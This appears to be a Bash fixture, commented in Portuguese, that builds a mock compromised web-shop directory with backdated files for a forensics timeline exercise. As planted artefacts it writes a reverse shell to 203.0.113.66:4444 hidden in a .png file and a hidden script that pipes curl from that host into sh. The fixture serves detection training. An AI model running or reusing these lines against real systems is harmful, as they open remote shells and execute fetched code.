#!/usr/bin/env bash
# Invasão de madrugada: arquivos legítimos antes da janela, três plantados dentro dela
# (03:00–04:00 de 13/09/2026) e uma rotina legítima depois.
set -euo pipefail

raiz=/srv/deploy/loja
mkdir -p "$raiz"/{app,scripts,logs,public/css,public/img}

legitimo() {  # legitimo <data> <caminho> <conteúdo>
  printf '%s\n' "$3" > "$raiz/$2"
  touch -d "$1" "$raiz/$2"
}

legitimo "2026-09-12 21:04" app/servidor.conf    "porta 8080"
legitimo "2026-09-12 21:06" app/rotas.yml        "/: vitrine"
legitimo "2026-09-12 21:15" scripts/publicar.sh  "#!/bin/sh"
legitimo "2026-09-12 21:15" public/css/site.css  "body { margin: 0 }"
head -c 4096 /dev/urandom > "$raiz/public/img/logo.jpg"; touch -d "2026-09-12 21:20" "$raiz/public/img/logo.jpg"
head -c 2048 /dev/urandom > "$raiz/public/img/produto-01.jpg"; touch -d "2026-09-12 21:21" "$raiz/public/img/produto-01.jpg"
legitimo "2026-09-12 23:48" app/versao.txt       "2026.09.12-1"
legitimo "2026-09-13 02:55" app/cache.json       "{}"                # perto, mas fora da janela

# Os plantados.
cat > "$raiz/public/img/banner-promo.png" <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/203.0.113.66/4444 0>&1
EOF
touch -d "2026-09-13 03:12" "$raiz/public/img/banner-promo.png"
mkdir -p "$raiz/public/img/.cache"
printf 'tk=7f3a-99c1\n' > "$raiz/public/img/.cache/.sessao"
touch -d "2026-09-13 03:27" "$raiz/public/img/.cache/.sessao"
printf '#!/bin/sh\ncurl -s http://203.0.113.66/b | sh\n' > "$raiz/scripts/.atualizar"
touch -d "2026-09-13 03:41" "$raiz/scripts/.atualizar"

# Depois da janela: a rotina legítima de logs.
legitimo "2026-09-13 04:30" logs/rotacao.log "rotação ok"

# As pastas também têm mtime (muda quando algo é criado dentro delas).
touch -d "2026-09-13 03:27" "$raiz/public/img/.cache" "$raiz/public/img"
touch -d "2026-09-13 03:41" "$raiz/scripts"
touch -d "2026-09-13 04:30" "$raiz/logs"
touch -d "2026-09-12 23:48" "$raiz/app"
touch -d "2026-09-12 21:15" "$raiz/public/css" "$raiz/public" "$raiz"
